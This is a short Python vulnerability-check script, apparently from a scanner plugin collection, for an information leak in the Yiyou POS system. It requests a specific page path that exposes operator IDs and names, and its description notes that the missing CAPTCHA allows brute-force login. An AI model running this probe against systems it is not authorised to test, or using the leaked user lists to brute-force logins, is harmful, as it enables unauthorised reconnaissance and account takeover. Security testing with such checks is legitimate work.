#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 依友POS系统登陆信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2010-0155657
author: Lucifer
description: 依友POS系统用户名列表泄露，且系统无验证码，可暴力破解登陆。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class yeu_disclosure_uid:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/Code/System/FunRepManage/SelFunOper.aspx?rid=0001"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"OperID" in req.text and r"OperName" in req.text:
                printGreen("[+]Success:存在依友POS系统登陆信息泄露漏洞...(中危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在yeu_disclosure_uid漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = yeu_disclosure_uid(sys.argv[1])
    testVuln.run()